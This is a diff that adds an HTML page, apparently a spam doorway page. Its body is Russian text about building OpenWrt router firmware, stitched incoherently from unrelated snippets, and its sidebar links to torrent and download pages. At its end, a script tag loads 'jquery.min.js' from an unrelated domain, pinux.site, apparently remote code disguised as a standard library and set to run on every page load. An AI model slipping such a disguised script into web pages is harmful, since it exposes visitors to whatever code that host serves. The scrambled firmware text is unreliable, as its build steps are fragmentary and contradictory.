@@ -1,0 +1,145 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Openwrt собираем прошивку - ohthahyoo.milkmattersbloomington.org</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">ohthahyoo.milkmattersbloomington.org</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Openwrt собираем прошивку</h2>
+                            </header>
+                            <p>Собираем прошивку openwrt на маршрутизатор TL-MR3020 Для начала нам понадобиться компьютер с Linux на борту, я буду использовать дистрибутив Elementary. Собираем прошивку OpenWrt на Ubuntu 12.04 i386 для D-link dir-320. Просмотр установленных пакетов в готовой прошивке OpenWrt до прошивки ее в  набираем в яндекс "собираем прошивку из транка". 
+Статья о том, как самому собрать прошивку LEDE OpenWRT для своего роутера. В предыдущей статье было разобрано как установить уже скомпилированную прошивку. Скачиваем Buildroot OpenWrt. Можно собрать прошивку с версией ядра 2.6 или 3.3.8. Ядро 2.6 Backfire 10.03. Попробую и я себя в роли пейсателя. думаю Ачатовцы будут не против. В данной статье я попытаюсь раписать от А до Я весь процесс сборки кастомной прошивки для. Прошивка D Link Dir 100 Openwrt Очень помогло откатить прошивку на dir 620 d1 на.  Ранее писал, как собрать прошивку OpenWRT на примере D-Link DIR-320. Попытки прошить DIR-300 прошивкой от OpenWrt успехом не увенчались,  но собрать не удалось. Может быть я вернусь к этому вопросу позже а пока. Подготовка прошивки OpenWRT к подключению USB-  Для поддержки USB-накопителей Вам необходимо либо собрать прошивку с включением следующих. 
+Появилась необходимость собрать некую роботизированную установку с возможностью удаленного управления. Пока. Мне достался бесплатный DSL роутер от МТС под названием sagem f@ast 2804 v.2. DSL мне не нужен, а вот сделать из этого инвалида нормальный роутер было бы здорово. В данной статье я хотел бы поделиться опытом сборки собственной прошивки openwrt, с выбором нужных пакетов, а также настройкой отказоустойчивого доступа в интернет. 
+Обновите репозиторий: /scripts/feeds update -a "Установите" загруженные пакеты (не обязательно, но требуется, если вы хотите , к примеру, собрать прошивку с LuCI). Сравнение альтернативных прошивок openwrt, dd-wrt и прошивка от Олега.  В image builder для openwrt вы сможете собрать прошивку сразу с нужными настройками сети. Для начала нам понадобиться компьютер с Linux на борту, я буду использовать дистрибутив Elementary. После того, как вы установили прошивку OpenWrt на свое устройство,  Начните здесь если вы хотите собрать собственную прошивку. OpenWRT — сборка из исходников прошивки Написал Денис Юрьев в 05.10.2013 46 комментариев DD-WRT несколько закрытый проект и тем. Во всех этих случаях можно поставить ту или иную прошивку,  Если тебя по какой-то причине не устраивает стандартный образ OpenWRT, то можно собрать свой. О том, как собрать свою прошивку LEDE OpenWRT из исходных кодов под ваше устройство,  мы не собираем никакой информации о пользователях и не храним. Если собрать прошивку самостоятельно без Веб-интерфейса и установки  и пользоваться всеми или почти всеми пакетами из OpenWRT. Прошивки у него вполне. 
+Здравствуйте! Такой вопрос: можно ли каким-то образом собрать прошивку в которой заранее будут прописаны какие-то настройки. Продолжая развивать свой опыт по переделке мясорубок в комбайны роутеров в шаринг боксы, столкнулся с тем,что надо стало собрать и скомпилировать прошивку. Удалось в итоге собрать прошивку? Сейчас так же столкнулся с выпиленным с OpenWRT упоминанием о Realtek  Форум Помогите собрать прошивку openwrt для. Собираем прошивку OpenWRT Устанавливаем Subversion sudo apt-get install subversion Скачиваем последние исходники В исходниках прошивки OpenWRT есть и исходники кросскомпилятора, а так же сопутствующих программ,  Как прошивку собирать мы говорили в предыдущей. Прошивки OpenWRT для роутера TP-LINK TL-WR842ND V2 буду выкладывать и обновлять на сайте https:  а также могу собрать прошивку на самом-самом новом. Наша прошивка, которую мы сделаем в итоге, будет поддерживать USB.  Собираем openwrt на DIR-615 с нужными пакетами и прошиваем. 
+Кросс компиляция прошивки OpenWRT и пакетов на Ubuntu Linux для  Никак не удаётся собрать прошивку для MR3040 так как это делается для MR3020. # svn co svn://svn.openwrt.org/openwrt/branches/backfire backfire_dir-320 && cd backfire_dir-320.  ли все необходимое програмное обеспечение для создания прошивки и собираем tools и toolchain. </p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="r6t5-world-of-tanks-kak-ustanovit-mody-video.html">World of tanks как установить моды видео</a></li>
+                                <li><a href="r6t5-vyazma-gagarin-raspisanie.html">Вязьма гагарин расписание</a></li>
+                                <li><a href="r6t5-skachat-torrent-norm-i-nesokrushimye.html">Скачать торрент норм и несокрушимые</a></li>
+                                <li><a href="r6t5-svyazat-kryuchkom-chehol-dlya-telefona-shemy.html">Связать крючком чехол для телефона схемы</a></li>
+                                <li><a href="r6t5-kartochnaya-igra-devyatka-skachat-cherez-torrent.html">Карточная игра девятка скачать через торрент</a></li>
+                                <li><a href="r6t5-principialnye-shemy-cvetomuzykalnyh-ustroystv.html">Принципиальные схемы цветомузыкальных устройств</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="r6t5-skachat-igru-igry-dlya-malchikov.html">Скачать игру игры для мальчиков</a></li>
+                                            <li><a href="r6t5-skachat-knigu-vospominaniya-neobrazumivshegosya-molodogo-cheloveka-fb2.html">Скачать книгу воспоминания необразумившегося молодого человека fb2</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="r6t5-skachat-torrent-ihf-handball-challenge-12.html">Скачать торрент ihf handball challenge 12</a></li>
+                                            <li><a href="r6t5-skachat-besplatno-pesnyu-dilemma-nelly.html">Скачать бесплатно песню dilemma nelly</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="r6t5-konverter-jpg-v-pdf-onlayn.html">Конвертер jpg в pdf онлайн</a></li>
+                                            <li><a href="r6t5-vse-metodiki-po-psihologii.html">Все методики по психологии</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="r6t5-drayvera-amd-radeon-hd-6700-series-skachat.html">Драйвера amd radeon hd 6700 series скачать</a></li>
+                                            <li><a href="r6t5-reshebnik-po-russkomu-pechatnaya-tetrad.html">Решебник по русскому печатная тетрадь</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
